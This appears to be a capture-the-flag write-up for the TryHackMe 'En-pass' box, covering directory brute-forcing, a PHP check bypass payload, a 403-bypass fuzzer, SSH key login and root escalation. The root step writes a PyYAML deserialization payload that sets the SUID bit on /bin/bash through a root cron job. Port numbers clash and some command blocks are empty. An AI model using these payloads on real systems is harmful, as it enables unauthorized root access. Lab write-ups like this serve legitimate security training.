[En-pass](https://tryhackme.com/room/enpass) is a medium rated Linux box on Tryhackme by [kiransau](https://tryhackme.com/p/kiransau). We obtain a encrpyted private key on the webserver after bruteforcing for directories and files using gobuster. Password for that key is obtained after passing the checks implemented on reg.php file and at last, user for the box was obtained from bypassing a 403 page. On the box, cronjob was exploited to get a shell on the box as root.

We have only two ports open. SSH is running on port 80 and a HTTP server is running on port 8081 and the banner is telling us this is a ubuntu box. Since there is not much to look into the SSH service, let us start the enumeration with HTTP service on port 8001.

# HTTP service on Port 8001

On the homepage, we can see  lovely pictures of temple from Patan Durbar Square, Kathmandu Nepal.

We get a encrpyted private key.

## Trying to decrypt the key using john
### Using ssh2john to convert into hash
```console
reddevil@ubuntu:~/Documents/tryhackme/enpass$ locate ssh2john
/opt/john/ssh2john.py
reddevil@ubuntu:~/Documents/tryhackme/enpass$ /opt/john/ssh2john.py key > hash
reddevil@ubuntu:~/Documents/tryhackme/enpass$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.

```
And the password was not cracked by john as it was not available on `rockyou.txt`. 

## Visiting /zip
![2](/assets/images/thm/enpass/2.png)
We get a list of zip files. There are about 100 zip files. As we can see on the picture, all the zip files have exact date of modification and size, except the file `a.zip`.

## Downloading and extracting the zip files
### Downloading a.zip first
![3](/assets/images/thm/enpass/3.png)

### Extracting the content
![4](/assets/images/thm/enpass/4.png)
As I was manually extracting the zip files, all of the zip files have a file called `a` inside them and the content on the file was sadman.

### Downloading and extracting remaining zip files
![5](/assets/images/thm/enpass/5.png)
This went on and all I got was sadman.

This was a dead end. So, lets continue with our enumeration.

# Visiting /reg.php
![6](/assets/images/thm/enpass/6.png)

## Checking the source
![7](/assets/images/thm/enpass/7.png)
There is a PHP code with some checks implemented. And the code says we will get what we need if we pass the checks being implemented.

## PHP code
```php
<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          $val = explode(",",$title);
          $sum = 0;
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          }

          if ( ($sum) == 9 ){
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";
            }
                    else{
                      echo "  Try Try!!";
                    }
          }
          else{
            echo "  Try Again!! ";
          }     
  }
```
The condition is that our POST variable `title`  should not contain any alphanumeric characters. After that explode with `,` which will break our title variable into arrays. Looking at the for loop, we have to pass the title variable such that there will be 9 element in the array. So to do that, we have to use 8 commas (,) on our title variable and few simple check are being implemented afterwards. 

So considering all the checks the final payload will be
```php
$title = $$,!,@,#,$,^,&,*,(((
```

### Submiting the payload
![8](/assets/images/thm/enpass/8.png)
And we get the password. Now we can try if this is the password for that key.

## Trying to decrypt the key with the obtained password
```console
reddevil@ubuntu:~/Documents/tryhackme/enpass/zip$ openssl rsa -in=key
Enter pass phrase for key:

-----END RSA PRIVATE KEY-----
```
And we successfully decrypt the key. 
Since the SSH is open, we can try and login with this private key, but the problem is that we do not have a username yet.

I have spent a fair amount of time here.
## Bruteforcing the username
 I have used the namelist from the Seclists trying to guess the user on the box.
```console
reddevil@ubuntu:~/Documents/tryhackme/enpass/zip$ wc -l /usr/share/wordlists/Seclists/Usernames/Names/names.txt 
10164 /usr/share/wordlists/Seclists/Usernames/Names/names.txt
```
But I was unsuccessful.

## Using Public Exploit
According to the output of the Nmap, the version of SSH running on the box is `OpenSSH 7.2p2` and this version was vulnerable to user enumeration, but still it gave so many false positives.

![9](/assets/images/thm/enpass/9.png)

## Checking /403.php

![11](/assets/images/thm/enpass/11.png)

Looking at the page, It looked like we have to bypass this forbidden 403 to get what we are looking for, i.e. username.
And also looking at the hint provided by the creator, it seems to be the right path.

![10](/assets/images/thm/enpass/10.png)
So I manually tried bunch of custom header and things but was not able to bypass the check. Then I searched and downloaded few github tools which try multiple payloads to try and bypass the 403 error. From those tools, one seem to get what I wanted and the check was bypassed.

## Fuzzing with [403fuzzer](https://github.com/intrudir/403fuzzer)
### Cloning the repo
```console

### Checking the options
```console

403fuzzer.py  functions.py  header_payloads.txt  README.md  url_payloads.txt
reddevil@ubuntu:~/Documents/tryhackme/enpass/403fuzzer$ python 403fuzzer.py -h
usage: 403fuzzer.py [-h] [-u URL] [-c COOKIES] [-p PROXY] [-hc HC] [-hl HL]

use this script to fuzz endpoints that return a 401/403

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Specify the target URL
  -c COOKIES, --cookies COOKIES
                        Specify cookies to use in requests. (e.g., --cookies "cookie1=blah; cookie2=blah")
  -p PROXY, --proxy PROXY
                        Specify a proxy to use for requests (e.g., http://localhost:8080)
  -hc HC                Hide response code from output, single or comma separated
  -hl HL                Hide response length from output, single or comma separated

```
It is nice that it has option for proxy. Now we can analyse the whole traffic using burpsuite.

### Running the exploit

![12](/assets/images/thm/enpass/12.png)
The exploit was running and I was observing the response on the burpsuite. And I get a different reponse length with status code 200.
![13](/assets/images/thm/enpass/13.png)
And we get the username. So, lets try and login using the private key that we have obtained before.

# Shell as imsau
![14](/assets/images/thm/enpass/14.png)
And we get a shell on the box.

# Privilege Escalation
I ran linpeas first and did not get that much information from it. So as I was manually looking through different directories, I found a `script` directory on `/opt`.
```console
imsau@enpass:/opt/scripts$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 31 19:40 .
drwxr-xr-x 3 root root 4096 Jan 31 16:34 ..
-r-xr-xr-x 1 root root  250 Jan 31 19:40 file.py
```

## Content of file.py
```py
#!/usr/bin/python
import yaml


class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())

```
It loads the content of file `/tmp/file.yml` and passes to `yaml.load()` function. 
### Checking if /tmp/file exists
```console
imsau@enpass:/opt/scripts$ ls -la /tmp
total 28
drwxrwxrwt  7 root root 4096 Feb 12 17:52 .
drwxr-xr-x 23 root root 4096 Feb 12 16:37 ..
drwxrwxrwt  2 root root 4096 Feb 12 16:37 .font-unix
drwxrwxrwt  2 root root 4096 Feb 12 16:37 .ICE-unix
drwxrwxrwt  2 root root 4096 Feb 12 16:37 .Test-unix
drwxrwxrwt  2 root root 4096 Feb 12 16:37 .X11-unix
drwxrwxrwt  2 root root 4096 Feb 12 16:37 .XIM-unix
```
And there is no /tmp/file.yml.

This means that we can create a file called `/tmp/file.yml` with arbitary content and this content will be passed to `yaml.load()` function. I checked online  and found that this can be used to execute code on the box. This can be visualized as desearialization of untrusted user input.

Even though this code was vulnerable, we must be somehow able to execute this script as root.

## Checking sudo -l
```console
imsau@enpass:/opt/scripts$ sudo -l
[sudo] password for imsau: 
```
And we are prompted for a password which we do not have currently.
So, I decided to upload [pspy](https://github.com/DominicBreuker/pspy) and check if there are any cron jobs running on the box.


## Running PSPY on the box
![15](/assets/images/thm/enpass/15.png)
We can notice few things on this image. There is a cronjob which is being executed by root every minute. It executes the script `/opt/scripts/file.py`, removes the file `/tmp/file.yml`, changes the owner of the file `/tmp/file.yml` and again executes and deletes it. It's kind of strange to be honest. But what we can do is make a file with our malicious payload and run a infinite loop which copies this malicious payload to `/tmp/file.yml`.

## Content of shell.yml
```yml
!!python/object/apply:os.system ["chmod 4777 /bin/bash"]
```
We just set the SUID bit on the `/bin/bash` binary.

## Executing infinite loop and watching the binary using watch

And after a minute or so, the bash binary has SUID bit set on it.

## Getting a root shell
```console
imsau@enpass:/tmp$ /bin/bash -p
bash-4.3# id
uid=1002(imsau) gid=1002(imsau) euid=0(root) groups=1002(imsau)
bash-4.3# 
```
And we are root.
